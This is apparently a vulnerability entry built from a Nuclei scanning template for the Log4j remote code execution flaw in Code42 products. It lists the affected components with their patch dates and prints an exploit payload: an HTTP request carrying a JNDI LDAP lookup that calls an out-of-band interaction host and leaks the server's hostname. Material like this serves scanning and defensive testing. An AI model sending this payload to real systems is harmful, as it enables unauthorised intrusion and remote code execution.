# Vulnerability: Apache Code42 - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`code42-log4j-rce.yaml`)

## Description
Multiple Code42 components are impacted by the logj4 vulnerability. Affected Code42 components include:
- Code42 cloud: Updated Log4j from 2.15.0 to 2.17.1 on January 26, 2022
- Code42 app for Incydr Basic and Advanced and CrashPlan Cloud product plans: Updated Log4j from 2.16.0 to 2.17.1 on January 18, 2022
- Code42 User Directory Sync (UDS): Updated Log4j from 2.15.0 to 2.17.1 on February 2, 2022
- On-premises Code42 server: Mitigated from Log4j vulnerabilities by following these steps
- On-premises Code42 app: Updated to Log4j 2.16 on December 17, 2021

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/c42api/v3/LoginConfiguration?username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&url=https://localhost
```

